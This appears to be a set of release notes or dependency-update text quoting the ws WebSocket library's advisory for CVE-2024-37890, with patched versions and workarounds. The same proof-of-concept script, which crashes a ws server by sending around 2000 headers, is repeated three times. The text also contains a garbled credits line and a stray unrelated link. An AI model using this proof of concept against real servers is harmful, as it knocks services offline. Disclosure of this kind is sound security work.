It is possible that the Upgrade header is correctly received and handled

(the `'upgrade'` event is emitted) without its value being returned to

the user. This can happen if the number of received headers exceed the

`server.maxHeadersCount` or `request.maxHeadersCount` threshold. In this

case `incomingMessage.headers.upgrade` may not be set.

Handle the case correctly and abort the handshake.

Fixes [#2230](https://github.com/websockets/ws/issues/2230)

### GitHub Vulnerability Alerts

####
[CVE-2024-37890](https://togithub.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q)

### Impact

A request with a number of headers exceeding
the[`server.maxHeadersCount`][] threshold could be used to crash a ws
server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1
(https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)
and backported to ws@7.5.10
(https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f),
ws@6.2.3
(https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63),
and ws@5.2.4
(https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1. Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options
so that no more headers than the `server.maxHeadersCount` limit can be
sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Credits

LaPointe](https://togithub.com/rrlapointe) in

### GitHub Vulnerability Alerts

####
[[CVE-2024-37890](https://github.com/advisories/GHSA-3h5v-q93c-6h6q "CVE-2024-37890")](<https://togithub.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q>)

### Impact

A request with a number of headers exceeding
the[`server.maxHeadersCount`][] threshold could be used to crash a ws
server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1
([websockets/ws@e55e510](https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c))
and backported to ws@7.5.10
([websockets/ws@22c2876](https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f)),
ws@6.2.3
([websockets/ws@eeb76d3](https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63)),
and ws@5.2.4
([websockets/ws@4abd8f6](https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e))

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1. Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options
so that no more headers than the `server.maxHeadersCount` limit can be
sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Bug fixes

- Fixed a DoS vulnerability
([#&[#8203](https://github.com/camunda/camunda/pull/8203);2231](<https://togithub.com/websockets/ws/issues/2231>)).

A request with a number of headers exceeding
the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```
